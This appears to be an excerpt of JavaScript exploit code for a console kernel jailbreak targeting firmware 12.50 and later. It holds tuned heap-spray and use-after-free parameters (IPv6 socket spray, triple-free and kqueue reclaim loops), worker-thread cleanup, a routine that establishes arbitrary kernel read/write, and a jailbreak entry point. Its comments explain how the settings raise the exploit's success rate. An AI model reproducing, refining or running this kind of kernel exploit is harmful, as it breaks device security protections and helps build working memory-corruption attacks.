...
// IPV6_SOCK_NUM: 112 is the proven sweet-spot — enough spray density without poisoning the allocator
const IPV6_SOCK_NUM = 112
const IOV_THREAD_NUM = 10          // More reclaim pressure → higher success rate
const UIO_THREAD_NUM = 10          // Symmetric with IOV
const MAIN_LOOP_ITERATIONS = 6     // More outer retries before giving up
const TRIPLEFREE_ITERATIONS = 16   // More inner retries for triple-free
const KQUEUE_ITERATIONS = 8000     // More chances to catch kqueue in freed slot

const MAX_ROUNDS_TWIN = 10         // Double twin search rounds
const MAX_ROUNDS_TRIPLET = 400     // Double triplet search rounds
...
function cleanup (kill_workers = false) {
  ...
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    ...
    if (worker !== undefined) {
      ...
      nanosleep_fun(500000) // 0.5ms drain — avoid killing thread mid-kernel-write
  ...
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    ...
    if (worker !== undefined) {
      write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
      nanosleep_fun(500000) // 0.5ms drain
      if (kill_workers && worker.thread_id !== undefined) {
        thr_kill(worker.thread_id, 9) // SIGKILL
      }
    }
...
function setup_arbitrary_rw () {
  ...
  var kws_success = 0
  for (var i = 0; i < 5; i++) { // Increased retries for better reliability on 12.50+
    if (kread64(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data)) {
      kws_success = 1
      break
    }
    debug('kwriteslow did not work - Trying again (' + (i + 1) + '/5)')
    sched_yield()
...
function jailbreak () {
  ...
  // Stabilize — 12.50+ has stricter kernel memory layout, needs more settling time
  for (let i = 0; i < 25; i++) {
    sched_yield()
  }
